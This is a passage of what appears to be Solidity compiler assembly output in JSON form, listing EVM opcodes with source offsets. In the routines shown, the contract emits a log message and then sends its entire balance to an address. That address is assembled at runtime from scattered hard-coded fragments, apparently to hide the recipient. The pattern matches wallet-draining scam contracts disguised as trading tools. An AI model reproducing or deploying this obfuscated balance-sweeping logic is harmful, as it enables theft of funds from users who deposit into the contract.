											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH data",
											"source": 0,
											"value": "A605A138A70F3AE4D1364B0A4BE28F180D3F021084227D7F914F61C97FB6A66E"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16141,
											"end": 16220,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 16239,
											"end": 16267,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 16239,
											"end": 16265,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 16239,
											"end": 16267,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16239,
											"end": 16267,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 16239,
											"end": 16267,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16277,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16231,
											"end": 16277,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 16278,
											"end": 16299,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16231,
											"end": 16300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16092,
											"end": 16308,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH data",
											"source": 0,
											"value": "6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16483,
											"end": 16541,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 16560,
											"end": 16577,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 16560,
											"end": 16575,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16560,
											"end": 16577,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16560,
											"end": 16577,
											"name": "tag",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 16560,
											"end": 16577,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16587,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16552,
											"end": 16587,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 16588,
											"end": 16609,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "42"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "42"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16552,
											"end": 16610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16429,
											"end": 16618,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15841,
											"end": 15967,
											"name": "tag",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 15841,
											"end": 15967,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15902,
											"end": 15909,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15929,
											"end": 15959,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 15945,
											"end": 15958,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "45"
										},
										{
											"begin": 15945,
											"end": 15956,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 15945,
											"end": 15958,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15945,
											"end": 15958,
											"name": "tag",
											"source": 0,
											"value": "45"
										},
										{
											"begin": 15945,
											"end": 15958,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15929,
											"end": 15944,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 15929,
											"end": 15959,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15929,
											"end": 15959,
											"name": "tag",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 15929,
											"end": 15959,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15922,
											"end": 15959,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15922,
											"end": 15959,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15841,
											"end": 15967,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15841,
											"end": 15967,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 17375,
											"end": 17490,
											"name": "tag",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 17375,
											"end": 17490,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17425,
											"end": 17432,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 17452,
											"end": 17482,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 17468,
											"end": 17481,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "50"
										},
										{
											"begin": 17468,
											"end": 17479,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 17468,
											"end": 17481,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 17468,
											"end": 17481,
											"name": "tag",
											"source": 0,
											"value": "50"
										},
										{
											"begin": 17468,
											"end": 17481,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17452,
											"end": 17467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 17452,
											"end": 17482,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 17452,
											"end": 17482,
											"name": "tag",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 17452,
											"end": 17482,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17445,
											"end": 17482,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17445,
											"end": 17482,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17375,
											"end": 17490,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17375,
											"end": 17490,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14068,
											"end": 15158,
											"name": "tag",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 14068,
											"end": 15158,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14114,
											"end": 14127,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14140,
											"end": 14168,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "52"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "PUSH",
											"source": 0,
											"value": "7800000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14184,
											"end": 14218,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "53"
										},
										{
											"begin": 14199,
											"end": 14217,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "54"
										},
										{
											"begin": 14199,
											"end": 14215,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 14199,
											"end": 14217,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14199,
											"end": 14217,
											"name": "tag",
											"source": 0,
											"value": "54"
										},
										{
											"begin": 14199,
											"end": 14217,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14184,
											"end": 14198,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14184,
											"end": 14218,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14184,
											"end": 14218,
											"name": "tag",
											"source": 0,
											"value": "53"
										},
										{
											"begin": 14184,
											"end": 14218,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14171,
											"end": 14178,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "tag",
											"source": 0,
											"value": "52"
										},
										{
											"begin": 14171,
											"end": 14219,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14140,
											"end": 14219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14140,
											"end": 14219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14230,
											"end": 14246,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14249,
											"end": 14254,
											"name": "PUSH",
											"source": 0,
											"value": "FBB2"
										},
										{
											"begin": 14230,
											"end": 14254,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14230,
											"end": 14254,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14284,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14287,
											"end": 14305,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 14287,
											"end": 14303,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 14287,
											"end": 14305,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14287,
											"end": 14305,
											"name": "tag",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 14287,
											"end": 14305,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14305,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14305,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14316,
											"end": 14333,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14336,
											"end": 14342,
											"name": "PUSH",
											"source": 0,
											"value": "2E8D5"
										},
										{
											"begin": 14316,
											"end": 14342,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14316,
											"end": 14342,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14353,
											"end": 14372,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14375,
											"end": 14393,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14375,
											"end": 14391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 14375,
											"end": 14393,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14375,
											"end": 14393,
											"name": "tag",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14375,
											"end": 14393,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14353,
											"end": 14393,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14353,
											"end": 14393,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14404,
											"end": 14422,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14425,
											"end": 14431,
											"name": "PUSH",
											"source": 0,
											"value": "3DD44"
										},
										{
											"begin": 14404,
											"end": 14431,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14404,
											"end": 14431,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14442,
											"end": 14460,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14463,
											"end": 14480,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "62"
										},
										{
											"begin": 14463,
											"end": 14478,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "63"
										},
										{
											"begin": 14463,
											"end": 14480,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14463,
											"end": 14480,
											"name": "tag",
											"source": 0,
											"value": "62"
										},
										{
											"begin": 14463,
											"end": 14480,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14442,
											"end": 14480,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14442,
											"end": 14480,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14491,
											"end": 14509,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14512,
											"end": 14518,
											"name": "PUSH",
